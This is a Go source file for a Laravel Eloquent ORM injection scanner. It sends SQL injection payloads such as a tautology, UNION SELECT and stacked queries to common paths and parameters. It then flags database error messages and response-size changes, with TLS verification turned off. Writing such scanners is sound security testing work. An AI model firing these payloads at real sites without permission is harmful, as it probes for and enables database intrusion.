package vulnerabilities

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// EloquentORMScanner checks for security issues in Laravel Eloquent ORM usage
type EloquentORMScanner struct{}

// NewEloquentORMScanner creates a new EloquentORMScanner
func NewEloquentORMScanner() *EloquentORMScanner {
	return &EloquentORMScanner{}
}

// Name returns the name of the scan
func (s *EloquentORMScanner) Name() string {
	return "Laravel Eloquent ORM Injection Scanner"
}

// Description returns the description of the scan
func (s *EloquentORMScanner) Description() string {
	return "Checks for security issues in Eloquent ORM queries and model relationships"
}

// Category returns the category of the scan
func (s *EloquentORMScanner) Category() string {
	return "vulnerabilities"
}

// Not needed anymore, using common.BuildURLPath

// Run executes the scan
func (s *EloquentORMScanner) Run(target string) []common.ScanResult {
	results := []common.ScanResult{}

	// Create HTTP client with appropriate settings
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Test URL paths that commonly use query parameters for database lookups
	testPaths := []string{
		"/users",
		"/posts",
		"/products",
		"/articles",
		"/categories",
		"/items",
		"/search",
		"/api/users",
		"/api/posts",
		"/api/products",
	}

	// Test query parameters known to trigger Eloquent queries
	testParams := []string{
		"id",
		"where",
		"order",
		"sort",
		"filter",
		"q",
		"query",
		"orderBy",
	}

	// SQL injection test payloads effective against Eloquent raw queries
	testPayloads := []string{
		"1' OR '1'='1",
		"1; SELECT * FROM users--",
		"users.email FROM users;--",
		"' UNION SELECT * FROM users--",
		"ORDER BY 10--",
	}

	// Test each path for potential Eloquent injection
	for _, path := range testPaths {
		// First check if the path exists
		baseUrl := common.BuildURLPath(target, path)
		resp, err := client.Get(baseUrl)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// If path exists, test with injection parameters
		if resp.StatusCode != 404 {
			for _, param := range testParams {
				for _, payload := range testPayloads {
					// Craft URL with payload
					testUrl := fmt.Sprintf("%s?%s=%s", baseUrl, param, payload)
					
					// Send the request
					payloadResp, err := client.Get(testUrl)
					if err != nil {
						continue
					}
					
					body, err := ioutil.ReadAll(payloadResp.Body)
					payloadResp.Body.Close()
					if err != nil {
						continue
					}
					
					bodyStr := string(body)
					
					// Check for SQL error messages that indicate successful injection
					sqlErrorPatterns := []string{
						"SQLSTATE",
						"syntax error",
						"mysql_fetch",
						"num_rows",
						"ORA-",
						"Warning: mysql_",
						"PostgreSQL.*ERROR",
						"quoted string not properly terminated",
						"unclosed quotation mark",
						"SQL syntax",
					}
					
					for _, pattern := range sqlErrorPatterns {
						if strings.Contains(bodyStr, pattern) || regexp.MustCompile(pattern).MatchString(bodyStr) {
							results = append(results, common.ScanResult{
								Category:    s.Category(),
								ScanName:    s.Name(),
								Path:        testUrl,
								Description: "Potential SQL Injection in Eloquent ORM",
								Detail:      fmt.Sprintf("SQL error detected when using payload: %s=%s", param, payload),
								StatusCode:  payloadResp.StatusCode,
								Severity:    "high",
							})
							break
						}
					}
					
					// Check for mass assignment vulnerability (if we get more data than expected)
					if payloadResp.StatusCode == 200 && len(body) > 10000 {
						// If the response is very large, this might indicate a successful injection
						results = append(results, common.ScanResult{
							Category:    s.Category(),
							ScanName:    s.Name(),
							Path:        testUrl,
							Description: "Potential large data leak through Eloquent query",
							Detail:      fmt.Sprintf("Large response detected (%d bytes) when using payload: %s=%s", len(body), param, payload),
							StatusCode:  payloadResp.StatusCode,
							Severity:    "medium",
						})
					}
					
					// Detect differences in response that might indicate successful injection
					originalResp, _ := client.Get(baseUrl)
					if originalResp != nil {
						originalBody, _ := ioutil.ReadAll(originalResp.Body)
						originalResp.Body.Close()
						
						// If original response and payload response differ significantly in size
						if len(originalBody) > 0 && float64(len(body))/float64(len(originalBody)) > 1.5 {
							results = append(results, common.ScanResult{
								Category:    s.Category(),
								ScanName:    s.Name(),
								Path:        testUrl,
								Description: "Potential Eloquent query manipulation",
								Detail:      fmt.Sprintf("Response size difference detected when using payload: %s=%s", param, payload),
								StatusCode:  payloadResp.StatusCode,
								Severity:    "medium",
							})
						}
					}
				}
			}
		}
	}

	return results
}
